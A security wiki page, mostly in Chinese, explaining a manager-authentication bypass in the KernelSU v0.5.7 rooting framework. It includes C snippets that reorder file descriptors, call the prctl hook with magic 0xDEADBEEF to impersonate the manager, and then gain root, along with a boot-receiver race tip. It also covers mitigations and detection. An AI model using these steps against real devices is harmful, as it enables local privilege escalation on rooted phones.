# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

KernelSU、APatch、SKRoot 和 Magisk 等 Rooting frameworks 经常修补 Linux/Android kernel，并通过 hooked syscall 向非特权 userspace 中的“manager”app 暴露特权功能。如果 manager-authentication 步骤存在缺陷，任何本地 app 都可以访问该 channel，并在已经 Root 的设备上提升权限。

本页总结了公开研究中发现的技术和陷阱（尤其是 Zimperium 对 KernelSU v0.5.7 的分析），帮助 red team 和 blue team 理解 attack surface、exploitation primitives 以及可靠的 mitigation。

---
## 架构模式：syscall-hooked manager channel

- Kernel module/patch hooks 一个 syscall（通常为 prctl），用于接收来自 userspace 的“commands”。
- Protocol 通常为：magic_value、command_id、arg_ptr/len ...
- userspace manager app 首先进行 authentication（例如 CMD_BECOME_MANAGER）。当 kernel 将 caller 标记为 trusted manager 后，才会接受 privileged commands：
- 向 caller 授予 root（例如 CMD_GRANT_ROOT）
- 管理 su 的 allowlists/deny-lists
- 调整 SELinux policy（例如 CMD_SET_SEPOLICY）
- 查询 version/configuration
- 由于任何 app 都可以调用 syscalls，因此 manager authentication 的正确性至关重要。

示例（KernelSU design）：
- Hooked syscall：prctl
- 将调用转发到 KernelSU handler 的 magic value：0xDEADBEEF
- Commands 包括：CMD_BECOME_MANAGER、CMD_GET_VERSION、CMD_ALLOW_SU、CMD_SET_SEPOLICY、CMD_GRANT_ROOT 等。

---
## KernelSU v0.5.7 authentication flow（实际实现）

当 userspace 调用 prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...) 时，KernelSU 会验证：

1) Path prefix check
- 提供的 path 必须以 caller UID 对应的预期 prefix 开头，例如 /data/data/<pkg> 或 /data/user/<id>/<pkg>。
- Reference：core_hook.c (v0.5.7) path prefix logic。

2) Ownership check
- 该 path 必须归 caller UID 所有。
- Reference：core_hook.c (v0.5.7) ownership logic。

3) 通过 FD table scan 进行 APK signature check
- 遍历 calling process 的 open file descriptors（FDs）。
- 选择第一个 path 匹配 /data/app/*/base.apk 的 file。
- 解析 APK v2 signature，并使用 official manager certificate 进行 verification。
- References：manager.c（iterating FDs）、apk_sign.c（APK v2 verification）。

如果所有 checks 都通过，kernel 会临时缓存 manager 的 UID，并在 reset 前接受来自该 UID 的 privileged commands。

---
## Vulnerability class：信任 FD iteration 中的“第一个匹配 APK”

如果 signature check 绑定的是在 process FD table 中找到的“第一个匹配 /data/app/*/base.apk”，那么它实际上并没有验证 caller 自身的 package。攻击者可以预先安排一个合法签名的 APK（真实 manager 的 APK），使其在 FD list 中出现在攻击者自身 base.apk 之前。

这种 trust-by-indirection 允许非特权 app 冒充 manager，而无需拥有 manager 的 signing key。

被利用的关键属性：
- FD scan 不会绑定 caller 的 package identity；它只会对 path strings 进行 pattern-matching。
- open() 返回可用的最低编号 FD。通过先关闭编号较低的 FDs，攻击者可以控制 ordering。
- Filter 只检查 path 是否匹配 /data/app/*/base.apk，而不会检查它是否对应 caller 的 installed package。

---
## Attack preconditions

- Device 已经使用存在漏洞的 Rooting framework Root（例如 KernelSU v0.5.7）。
- 攻击者可以在本地运行任意非特权 code（Android app process）。
- Real manager 尚未完成 authentication（例如刚 reboot 后）。某些 frameworks 会在成功后缓存 manager UID；你必须赢得 race。

---
## Exploitation outline（KernelSU v0.5.7）

High-level steps：
1) 构造指向自身 app data directory 的有效 path，以满足 prefix 和 ownership checks。
2) 确保 genuine KernelSU Manager base.apk 在一个编号低于自身 base.apk 的 FD 上打开。
3) 调用 prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...)，通过 checks。
4) 执行 CMD_GRANT_ROOT、CMD_ALLOW_SU、CMD_SET_SEPOLICY 等 privileged commands，以持久化 elevation。

Step 2（FD ordering）的实践注意事项：
- 通过遍历 /proc/self/fd symlinks，识别 process 中指向自身 /data/app/*/base.apk 的 FD。
- 关闭一个较低编号的 FD（例如 stdin、fd 0），然后先打开 legitimate manager APK，使其占用 fd 0（或任何低于自身 base.apk fd 的 index）。
- 将 legitimate manager APK 与 app 一同打包，使其 path 满足 kernel 的 naive filter。例如，将其放在匹配 /data/app/*/base.apk 的 subpath 下。

Example code snippets（Android/Linux，仅作说明）：

枚举 open FDs 以定位 base.apk entries：
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
强制一个编号较低的 FD 指向合法的管理器 APK：
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
通过 prctl hook 进行 Manager 认证：
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
成功后，特权命令（示例）：
- CMD_GRANT_ROOT：将当前进程提升为 root
- CMD_ALLOW_SU：将你的 package/UID 添加到 allowlist，以实现持久化 su
- CMD_SET_SEPOLICY：根据 framework 支持情况调整 SELinux policy

Race/persistence 提示：
- 在 AndroidManifest 中注册 BOOT_COMPLETED receiver（RECEIVE_BOOT_COMPLETED），以便在重启后尽早启动，并在真正的 manager 之前尝试 authentication。

---
## Detection and mitigation 指南

对于 framework 开发者：
- 将 authentication 绑定到调用者的 package/UID，而不是任意 FD：
- 从 UID 解析调用者的 package，并通过 PackageManager 根据已安装 package 的 signature 进行验证，而不是扫描 FD。
- 如果仅依赖 kernel，则使用稳定的调用者身份（task creds），并在由 init/userspace helper 管理的稳定事实源上进行验证，而不是依赖进程 FD。
- 避免使用路径前缀检查作为身份标识；调用者可以轻易满足此类检查。
- 在 channel 上使用基于 nonce 的 challenge–response，并在 boot 或关键事件发生时清除缓存的 manager 身份。
- 在可行的情况下，考虑使用基于 binder、经过 authentication 的 IPC，而不是滥用通用 syscall。

对于 defenders/blue team：
- 检测 rooting frameworks 和 manager 进程的存在；如果具备 kernel telemetry，则监控带有可疑 magic constants（例如 0xDEADBEEF）的 prctl 调用。
- 在受管控的设备群中，阻止或告警：不受信任的 package 注册 boot receivers，并在 boot 后快速尝试特权 manager 命令。
- 确保设备已更新至修复后的 framework 版本；更新时使缓存的 manager IDs 失效。

攻击的限制：
- 仅影响已经通过存在漏洞的 framework 获得 root 的设备。
- 通常需要在合法 manager 完成 authentication 之前利用 reboot/race window（某些 framework 会一直缓存 manager UID，直到被 reset）。

---
## 各 framework 的相关说明

- 基于密码的 auth（例如历史版本的 APatch/SKRoot builds）如果密码可被猜测或 brute-force，或者 validation 存在 bug，则可能较弱。
- 基于 package/signature 的 auth（例如 KernelSU）原则上更强，但必须绑定到实际调用者，而不是依赖 FD 扫描等间接 artefacts。
- Magisk：CVE-2024-48336（MagiskEoP）表明，即使是成熟的生态系统，也可能容易受到 identity spoofing 影响，从而在 manager context 内以 root 身份执行代码。

---
## References

- [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [KernelSU project](https://kernelsu.org/)
- [APatch](https://github.com/bmax121/APatch)
- [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
